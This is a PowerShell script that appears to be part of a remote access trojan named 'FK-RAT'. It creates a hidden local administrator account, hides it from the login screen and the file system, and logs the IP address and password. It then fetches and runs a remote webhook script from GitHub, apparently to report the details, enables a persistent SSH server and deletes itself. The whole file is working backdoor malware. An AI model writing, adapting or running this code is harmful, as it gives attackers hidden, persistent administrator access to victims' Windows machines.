## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}
word
## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText
$ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
$pWord = randomText
$uName = "fkrat"
$pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
$webhook = Get-Content ./webhook

New-Item ./$env:computername.fk -Value (
  $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
)

## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide FK-RAT User (Admin)
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000
Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}

## get webhook
Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/webhook.ps1 -OutFile webhook.ps1
.\webhook.ps1 $webhook

## goto Temp and make dir 
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

## Self Delete
Remove-Item $PSCommandPath -Force 